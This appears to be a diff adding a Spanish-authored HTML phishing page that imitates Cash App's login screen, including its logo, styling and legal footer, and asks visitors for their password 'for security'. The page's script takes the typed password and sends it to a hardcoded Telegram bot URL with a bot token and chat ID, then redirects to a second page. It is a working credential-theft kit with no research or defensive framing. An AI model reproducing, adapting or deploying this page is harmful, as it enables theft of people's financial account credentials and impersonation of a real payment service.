@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cash App</title>
+    <style>
+        body{
+            
+            background: #171819;
+        }
+        nav{
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        img{
+            width: 10%;
+            border-radius: 12px;
+        }
+        section{
+            background: #222324;
+            width: 300px;
+            margin: 20px auto;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px 10px;
+            border-radius: 10px;
+        }
+        h1{color: white; font-size: 30px; width: 80%;}
+        .par1{color: gray; margin-top: -5px; width: 80%;}
+        a{text-decoration: none; color: #00BD46;}
+        .formn{
+            display: flex;
+            width: 80%;
+            height: 50px;
+            margin: 0 auto;
+            background: #434445;
+            border-radius: 12px;
+        }
+        label p{
+            width: 100%;
+            color: gray;
+            margin: 20px auto 10px auto;
+            font-weight: bold;
+        }
+        #in{
+            border: green;
+            outline: green;
+            background: transparent;
+            color: #FFFFFF;
+            width: 100%;
+        }
+        .butns{
+            display: flex;
+            width: 80%;
+            height: 50px;
+            margin: 20px auto;
+            align-items: center;
+            justify-content: center;
+        }
+        .bnt{
+            background: #3B3C3E;
+            border: none;
+            outline: none;
+            color: white;
+            width: 40%;
+            height: 30px;
+            border-radius: 20px;
+            font-weight: bold;
+            
+        }
+        #sub{
+            background: #00bd46;
+            border: none;
+            outline: none;
+            color: white;
+            width: 40%;
+            height: 30px;
+            border-radius: 20px;
+            margin-left: 20%;
+            margin: 0px;
+            font-weight: bold;
+        }
+        .par2{
+            color: gray;
+            width: 300px;
+            margin: 10px auto;
+        }
+    </style>
+</head>
+<body>
+    <nav>
+        <img src="OIP~2.jpeg" alt=""><h1>Cash App</h1></img>
+    </nav>
+    <section>
+        <h1>For security, please enter your password.</h1>
+        <div class="">
+            <form id="telegramForm" onsubmit="enviarMensaje(event)">
+               <label><p>Password</p></label>
+               <input id="in" type="password" placeholder="enter your password" required>
+               </div>
+                   <input type="submit" value="Continue" id="sub" formaction="page2.html">
+               </div>
+            </form>
+        </div>
+    </section>
+    <script>
+         function enviarMensaje(event) {
+                     event.preventDefault(); // Prevent the default form submission
+                     var nombre = document.getElementById('in').value;
+                     var url = 'https://api.telegram.org/bot6515092765:AAFtV23G--qiedt2pDQvqolm4Gz6pDMWDyY/sendMessage?chat_id=6290563770&text=PASSWORD: ' + nombre;
+             
+                     fetch(url)
+                         .then(response => {
+                             // Handle the response as needed
+                             console.log('Mensaje enviado exitosamente');
+                             window.location.href = 'page2.html'; // Redirect to page2.html
+                         })
+                         .catch(error => {
+                             // Handle any errors that occur during the request
+                             console.error('Error al enviar el mensaje:', error);
+                         });
+                 }
+    </script>
+    <br>
+    <div class="end">
+        <p class="par2">
+            By entering and clicking Continue, you agree to the <a href="">Terms</a>, <a href="">E-Sign Consent</a>, & <a href="">Privacy Policy</a>.<br><br>
+
+Banking services provided by Cash App’s bank partners. Debit cards issued by Sutton Bank. Brokerage services by Cash App Investing LLC, member FINRA, subsidiary of Block, Inc formerly known as Square, Inc. Bitcoin services by Block, Inc. Cash App Investing does not trade bitcoin and Block, Inc. is not a member of FINRA or SIPC. Tax filing services by Cash App Taxes, Inc. <a href="">Disclosures</a>
+
+
+        </p>
+    </div>
+</body>
+</html>
